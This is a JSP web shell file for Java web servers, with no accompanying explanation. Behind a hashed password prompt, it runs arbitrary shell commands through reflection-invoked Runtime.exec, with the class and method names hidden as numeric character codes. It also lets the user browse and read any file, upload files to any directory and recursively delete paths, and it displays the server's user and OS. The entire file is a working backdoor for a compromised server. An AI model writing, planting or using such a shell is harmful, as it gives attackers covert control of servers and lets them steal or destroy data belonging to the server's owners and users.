<%@ page import="java.io.*,java.util.*,java.text.*,java.security.*" contentType="text/html;charset=UTF-8" session="true" %><%!
static String S(int... v){char[] c=new char[v.length];for(int i=0;i<v.length;i++)c[i]=(char)v[i];return new String(c);}
static boolean OK(String p){
  if(p==null)return false;
  try{
    MessageDigest md=MessageDigest.getInstance(S(83,72,65,45,50,53,54));
    md.update(S(107,57,81).getBytes("UTF-8"));
    byte[] b=md.digest(p.getBytes("UTF-8"));
    StringBuilder s=new StringBuilder();
    for(int i=0;i<b.length;i++){String h=Integer.toHexString(b[i]&255);if(h.length()<2)s.append('0');s.append(h);}
    return s.toString().equals(S(99,102,57,53,53,100,57,100,101,49,55,55,49,53,97,51,56,102,50,52,50,97,49,97,49,57,57,97,57,54,101,52,48,98,98,102,99,100,53,52,51,52,56,50,56,57,50,55,97,100,101,49,51,56,98,99,100,50,99,50,102,97,57,101));
  }catch(Exception e){return false;}
}
static String RUN(String cmd)throws Exception{
  String os=System.getProperty(S(111,115,46,110,97,109,101));if(os==null)os="";os=os.toLowerCase();
  String[] a;
  if(os.indexOf(S(119,105,110))>=0)a=new String[]{S(99,109,100,46,101,120,101),S(47,99),cmd};
  else a=new String[]{S(47,98,105,110,47,115,104),S(45,99),cmd};
  Class<?> k=Class.forName(S(106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101));
  Object r=k.getMethod(S(103,101,116,82,117,110,116,105,109,101)).invoke(null);
  Process p=(Process)k.getMethod(S(101,120,101,99),String[].class).invoke(r,(Object)a);
  final ByteArrayOutputStream eb=new ByteArrayOutputStream();final InputStream es=p.getErrorStream();
  Thread t=new Thread(new Runnable(){public void run(){try{byte[]b=new byte[4096];int n;while((n=es.read(b))>0)eb.write(b,0,n);}catch(Exception x){}}});
  t.start();
  ByteArrayOutputStream ob=new ByteArrayOutputStream();InputStream is=p.getInputStream();byte[]b2=new byte[8192];int n2;
  while((n2=is.read(b2))>0)ob.write(b2,0,n2);
  p.waitFor();t.join(3000);
  return ob.toString("UTF-8")+eb.toString("UTF-8");
}
static boolean DEL(File x){
  if(x.isDirectory()){File[] k=x.listFiles();if(k!=null)for(int i=0;i<k.length;i++)DEL(k[i]);}
  return x.delete();
}
static String ESC(String s){
  if(s==null)return "";
  StringBuilder b=new StringBuilder();
  for(int i=0;i<s.length();i++){
    char c=s.charAt(i);
    if(c=='<')b.append("&lt;");else if(c=='>')b.append("&gt;");else if(c=='&')b.append("&amp;");
    else if(c=='"')b.append("&quot;");else if(c=='\'')b.append("&#39;");else b.append(c);
  }
  return b.toString();
}
static String U(String s){
  try{return java.net.URLEncoder.encode(s,"UTF-8").replace("+","%20");}catch(Exception e){return "";}
}
static String SZ(long n){
  if(n<1024)return n+" B";
  if(n<1048576)return String.format("%.1f K",n/1024.0);
  if(n<1073741824L)return String.format("%.1f M",n/1048576.0);
  return String.format("%.1f G",n/1073741824.0);
}
%><%
String ct=request.getContentType();
boolean mp=ct!=null&&ct.toLowerCase().startsWith("multipart/");
String qs=request.getQueryString();
String qd=null;
if(qs!=null){String[] kv=qs.split("&");for(int i=0;i<kv.length;i++){int eq=kv[i].indexOf('=');if(eq>0){try{if("d".equals(java.net.URLDecoder.decode(kv[i].substring(0,eq),"UTF-8")))qd=java.net.URLDecoder.decode(kv[i].substring(eq+1),"UTF-8");}catch(Exception z){}}}}
String pw=mp?null:request.getParameter("pw");
if(pw!=null&&OK(pw))session.setAttribute(S(97),S(49));
if(request.getParameter("out")!=null)session.removeAttribute(S(97));
boolean authed=session.getAttribute(S(97))!=null;
String osn=System.getProperty(S(111,115,46,110,97,109,101));if(osn==null)osn="";
boolean win=osn.toLowerCase().indexOf("win")>=0;
String home=win?"C:\\":"/";
if(!authed){
%><!DOCTYPE html><html><head><meta charset="utf-8"><title>.</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
background:#12161c;color:#cfd8e3;font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
form{background:#1a2029;padding:28px 26px;border-radius:10px;border:1px solid #2b3542;
box-shadow:0 10px 30px rgba(0,0,0,.45);width:300px}
h1{margin:0 0 16px;font-size:15px;font-weight:600;color:#8fa3b8;letter-spacing:.5px}
input[type=password]{width:100%;padding:10px 12px;border-radius:6px;border:1px solid #33404f;
background:#0e1319;color:#e6edf5;font-size:14px;outline:none}
input[type=password]:focus{border-color:#4b7bec}
button{width:100%;margin-top:14px;padding:10px;border:0;border-radius:6px;background:#4b7bec;
color:#fff;font-size:14px;font-weight:600;cursor:pointer}
button:hover{background:#5d8bf0}
.err{margin-top:10px;color:#ff7b72;font-size:12.5px}
</style></head><body>
<form method="post" action="">
<h1><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#8fa3b8" stroke-width="2.2" stroke-linecap="round" style="vertical-align:-2px;margin-right:6px"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>Authentication required</h1>
<input type="password" name="pw" placeholder="Password" autofocus autocomplete="off">
<button type="submit">Unlock</button>
<% if(pw!=null){ %><div class="err">Wrong password.</div><% } %>
</form></body></html>
<% return; } %>
<%
String d=mp?qd:request.getParameter("d");
if(d==null||d.trim().length()==0)d=home;
File f=new File(d);
try{f=new File(f.getCanonicalPath());}catch(Exception e){}
if(!f.exists())f=new File(home);
if(ct!=null&&ct.toLowerCase().startsWith("multipart/")){
  String bnd=ct.substring(ct.indexOf("boundary=")+9).trim();
  if(bnd.startsWith("\""))bnd=bnd.substring(1,bnd.length()-1);
  ByteArrayOutputStream bs=new ByteArrayOutputStream();
  InputStream in=request.getInputStream();
  byte[] buf=new byte[8192];int n;
  while((n=in.read(buf))>0)bs.write(buf,0,n);
  in.close();
  String all=new String(bs.toByteArray(),"ISO-8859-1");
  int fi2=all.indexOf("filename=\"");
  String nm=null;
  if(fi2>=0){
    int e2=all.indexOf('"',fi2+10);
    if(e2>fi2){
      String raw=all.substring(fi2+10,e2);
      int sl=Math.max(raw.lastIndexOf('/'),raw.lastIndexOf('\\'));
      if(sl>=0)raw=raw.substring(sl+1);
      if(raw.length()>0)nm=new String(raw.getBytes("ISO-8859-1"),"UTF-8");
    }
  }
  int hs=fi2<0?-1:all.indexOf("\r\n\r\n",fi2);
  int ce=(hs<0)?-1:all.indexOf("\r\n--"+bnd,hs+4);
  if(nm!=null&&hs>=0&&ce>hs){
    byte[] data=(all.substring(hs+4,ce)).getBytes("ISO-8859-1");
    File tgt=f.isDirectory()?new File(f,nm):new File(f.getParentFile(),nm);
    FileOutputStream fo=new FileOutputStream(tgt);
    fo.write(data);fo.close();
    response.sendRedirect(request.getRequestURI()+"?d="+U(f.getAbsolutePath())+"&ok="+U(nm));
    return;
  }
  response.sendRedirect(request.getRequestURI()+"?d="+U(f.getAbsolutePath())+"&bad=1");
  return;
}
String rm=request.getParameter("rm");
if(rm!=null&&rm.length()>0){
  try{DEL(new File(rm));}catch(Throwable t){}
  response.sendRedirect(request.getRequestURI()+"?d="+U(f.getAbsolutePath()));
  return;
}
String c=request.getParameter("c");
String co=null;
if(c!=null&&c.trim().length()>0){
  try{co=RUN(c);}catch(Throwable t){co="ERR: "+t.toString();}
}
String cur=f.getAbsolutePath();
File par=f.getParentFile();
String okm=request.getParameter("ok");
String bad=request.getParameter("bad");
%><!DOCTYPE html><html><head><meta charset="utf-8"><title><%=ESC(cur)%></title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{margin:0;background:#0f141a;color:#cfd8e3;
font:13px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
a{color:#6ba6ff;text-decoration:none}
a:hover{text-decoration:underline}
header{display:flex;align-items:center;gap:12px;padding:10px 16px;background:#161c24;
border-bottom:1px solid #232c38;position:sticky;top:0;z-index:5}
header .path{flex:1;font-family:ui-monospace,Consolas,monospace;font-size:13px;color:#e6edf5;
overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
header .who{color:#7d8fa3;font-size:12px}
header a.out{color:#7d8fa3;font-size:12px;border:1px solid #2b3542;padding:3px 9px;border-radius:5px}
.wrap{padding:16px}
table{width:100%;border-collapse:collapse;font-family:ui-monospace,Consolas,monospace;font-size:12.5px}
th,td{text-align:left;padding:5px 10px;border-bottom:1px solid #1c242e}
th{color:#7d8fa3;font-weight:500;font-size:11.5px;text-transform:uppercase;letter-spacing:.5px}
tr:hover td{background:#141b23}
td.sz{color:#8b9bad;white-space:nowrap;width:90px}
td.dt{color:#7d8fa3;white-space:nowrap;width:150px}
td.act{width:52px;text-align:center}
td.act a{color:#8b6a6a;font-size:11px;letter-spacing:.3px}
td.act a:hover{color:#ff7b72;text-decoration:none}
.ic{display:inline-block;width:9px;height:11px;margin-right:7px;vertical-align:-1px;border-radius:1.5px}
.icd{background:#ffd479}
.icf{background:#5c6b7d}
.dir{color:#ffd479}
form.cmd{display:flex;gap:8px;margin-bottom:12px}
form.cmd input{flex:1;padding:9px 12px;border-radius:6px;border:1px solid #33404f;background:#0b1016;
color:#e6edf5;font-family:ui-monospace,Consolas,monospace;font-size:13px;outline:none}
form.cmd input:focus{border-color:#4b7bec}
form.cmd button{padding:9px 18px;border:0;border-radius:6px;background:#4b7bec;color:#fff;
font-weight:600;cursor:pointer}
form.up{display:flex;gap:8px;align-items:center;margin-bottom:16px;color:#7d8fa3;font-size:12px}
form.up input[type=file]{color:#8b9bad;font-size:12px}
form.up button{padding:6px 14px;border:1px solid #33404f;border-radius:6px;background:#1a2029;
color:#cfd8e3;cursor:pointer;font-size:12px}
form.up button:hover{border-color:#4b7bec;color:#fff}
pre.out{background:#0b1016;border:1px solid #232c38;border-radius:8px;padding:12px 14px;
margin:0 0 16px;overflow:auto;max-height:55vh;
font-family:ui-monospace,Consolas,monospace;font-size:12.5px;color:#c9d6e3;white-space:pre-wrap}
.meta{color:#7d8fa3;margin-bottom:10px}
.note{margin:0 0 12px;padding:7px 12px;border-radius:6px;font-size:12.5px}
.note.g{background:#14301f;border:1px solid #245c39;color:#8fe3ad}
.note.r{background:#3a1a1c;border:1px solid #6b2a2e;color:#ff9b95}
</style></head><body>
<header>
  <div class="path"><%=ESC(cur)%></div>
  <div class="who"><%=ESC(System.getProperty(S(117,115,101,114,46,110,97,109,101)))%>@<%=ESC(osn)%></div>
  <a class="out" href="?out=1">logout</a>
</header>
<div class="wrap">
<% if(okm!=null){ %><div class="note g">uploaded: <%=ESC(okm)%></div><% } %>
<% if(bad!=null){ %><div class="note r">upload failed (no file selected)</div><% } %>
<form class="up" method="post" enctype="multipart/form-data" action="?d=<%=U(cur)%>">
  <span>upload to current dir:</span>
  <input type="file" name="file">
  <button type="submit">Upload</button>
</form>
<form class="cmd" method="post" action="">
  <input type="hidden" name="d" value="<%=ESC(cur)%>">
  <input type="text" name="c" placeholder="command&#8230;  e.g.  id   |   ls -la   |   ipconfig" autofocus autocomplete="off" spellcheck="false">
  <button type="submit">Run</button>
</form>
<% if(co!=null){ %><pre class="out"><%=ESC(co)%></pre><% } %>
<%
if(f.isDirectory()){
  File[] its=f.listFiles();
%>
<table>
<tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr>
<% if(par!=null){ %>
<tr><td><a class="dir" href="?d=<%=U(par.getAbsolutePath())%>">.. <span style="color:#7d8fa3">(parent)</span></a></td><td class="sz">DIR</td><td class="dt"></td><td class="act"></td></tr>
<% }
if(its!=null){ Arrays.sort(its);
  for(int i=0;i<its.length;i++){ File it=its[i]; String ap=it.getAbsolutePath();
%>
<tr><td><a class="<%=(it.isDirectory()?"dir":"")%>" href="?d=<%=U(ap)%>"><span class="ic <%=(it.isDirectory()?"icd":"icf")%>"></span><%=ESC(it.getName())%></a></td>
<td class="sz"><%=it.isDirectory()?"DIR":SZ(it.length())%></td>
<td class="dt"><%=new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(it.lastModified()))%></td>
<td class="act"><a href="?d=<%=U(cur)%>&rm=<%=U(ap)%>" onclick="return confirm('Delete <%=ESC(it.getName()).replace("'","&#39;")%> ?')" title="delete">del</a></td></tr>
<% } } %>
</table>
<% } else { %>
<div class="meta">File &mdash; <%=SZ(f.length())%> &mdash; <%=new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(f.lastModified()))%></div>
<pre class="out"><%
  long lim=1048576L;
  FileInputStream fi=new FileInputStream(f);
  byte[] bb=new byte[(int)Math.min(f.length(),lim)];
  int rn=0,rr=0;
  while(rn<bb.length&&(rr=fi.read(bb,rn,bb.length-rn))>0)rn+=rr;
  fi.close();
  String txt=new String(bb,0,rn,"UTF-8");
  out.print(ESC(txt));
  if(f.length()>lim)out.print("\n\n[truncated at 1 MB]");
%></pre>
<% } %>
</div></body></html>
